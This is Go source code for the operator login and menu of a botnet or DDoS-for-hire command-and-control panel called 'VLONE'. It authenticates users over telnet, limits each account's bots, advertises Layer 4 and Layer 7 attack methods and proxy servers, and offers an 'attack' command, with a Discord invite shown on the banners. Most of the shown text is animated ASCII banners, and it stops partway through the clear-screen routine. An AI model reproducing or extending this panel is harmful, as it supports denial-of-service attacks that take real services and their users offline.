package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte(fmt.Sprintf("\033]0; VLONE | Authentication.\007")))// @xGkun
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[36m \r\n"))	
    this.conn.Write([]byte("\033[35m Username:\033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[36m Password:\033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[31m Access Denied. \r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

       this.conn.Write([]byte("\033[2J\033[1H"))// @xGkun// @xGkun// @xGkun// @xGkun
    go func() {
        i := 0
        for {
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {// @xGkun// @xGkun// @xGkun// @xGkun
            } else {
            }
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; VLONE | 14 Servers | API Edition | User > %s\007", username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))// @xGkun// @xGkun// @xGkun// @xGkun
            }
        }
    }()
    for i := 1; i<100; i++{
        asasd := strconv.Itoa(i)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\x1b[35mLoading: \x1b[32m " + asasd + "%\r\n"))
        time.Sleep(50 * time.Millisecond)
    }
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣  \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦   \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║   \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║   \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝  \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗  \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║  \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩  \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣  \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗   \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣      \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝     \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║  \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩  \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╦  ╦ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╚╗╔╝ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                   ╚╝  \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╦  ╦ ╦   \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╚╗╔╝ ║   \r\n"))
    this.conn.Write([]byte("\x1b[35m                                   ╚╝  ╩═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╦  ╦ ╦   ╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╚╗╔╝ ║   ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                   ╚╝  ╩═╝ ╚═╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╦  ╦ ╦   ╔═╗ ╔╗╔ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╚╗╔╝ ║   ║ ║ ║║║ \r\n"))
    this.conn.Write([]byte("\x1b[35m                                   ╚╝  ╩═╝ ╚═╝ ╝╚╝ \r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[36m                              ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╦╗╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ║║║║╣ ║  ║  ║ ║║║║║╣    ║ ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[36m                              ╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝   ╩ ╚═╝  \r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                                  ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                                   ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H")) //header
    this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                                           
    this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H")) //header
    this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                               
    this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H")) //header
    this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Proxy     > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                                         
    this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H")) //header
    this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Proxy     > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
    this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Servers   > 14                      \x1b[36m║\r\n"))                                                          
    this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H")) //header
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ \r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ \r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  \r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   \r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   \r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ \r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ \r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ \r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ \r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
    this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
    this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
    this.conn.Write([]byte("\x1b[36m                    ╚═══════════════════\x1b[35m══════════════════╝\r\n"))// @xGkun
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
    this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
    this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
    this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
    this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
    this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
    this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
    this.conn.Write([]byte("\x1b[36m                            ╚═══════════\x1b[35m═══════════╝\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
    this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
    this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
    this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
    this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
    this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
    this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
    this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
    this.conn.Write([]byte("\x1b[36m                            ╚═══╦═══════\x1b[35m═══════╦═══╝\r\n"))
    this.conn.Write([]byte("\x1b[36m                                ║  -----\x1b[35m-----  ║\r\n"))// @xGkun// @xGkun
    this.conn.Write([]byte("\x1b[36m                                ╚═══════\x1b[35m═══════╝\r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[36m" + username + "\x1b[35m@\x1b[36mV\x1b[35mL\x1b[36mO\x1b[35mN\x1b[36mE\x1b[35m-\x1b[36m-\x1b[35m> \x1b[37m\033[0m"))
        cmd, err := this.ReadLine(false)
		  if cmd == "help" || cmd == "help" || cmd == "?"  {
		  	this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[36m ╔═══════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35m                 VLONE                                \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35mquit     -  Exits.                                    \x1b[36m║\r\n"))            
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35mclear    -  Clears Your Screen.                       \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35mchat     -  Enable Chat Room.                         \x1b[36m║\r\n"))     
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35mstats    -  Show Stats.                               \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35ml4       -  Show Layer 4 Methods.                     \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35ml7       -  Show Layer 7 Methods.                     \x1b[36m║\r\n"))      
            this.conn.Write([]byte("\x1b[36m ║ \x1b[35mattack   -  Send An Attack.                           \x1b[36m║\r\n")) // @xGkun// @xGkun// @xGkun// @xGkun// @xGkun// @xGkun// @xGkun// @xGkun// @xGkun                                  
            this.conn.Write([]byte("\x1b[36m ╚═══════════════════════════════════════════════════════╝\r\n"))
            continue
		}
		  /*     if err != nil || cmd == "credits" || cmd == "CREDITS" {// @xGkun// @xGkun// @xGkun// @xGkun
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[36m ╔════════════════════╗\r\n"))                  
            this.conn.Write([]byte("\x1b[36m ║ \x1b[37mInsta: @xGkun      \x1b[36m║\r\n"))  
            this.conn.Write([]byte("\x1b[36m ║ \x1b[37mDiscord: Gku#1789  \x1b[36m║\r\n"))                                       
            this.conn.Write([]byte("\x1b[36m ╚════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
            continue
       }*/

		  if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m                    ╚═══════════════════\x1b[35m══════════════════╝\r\n"))// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
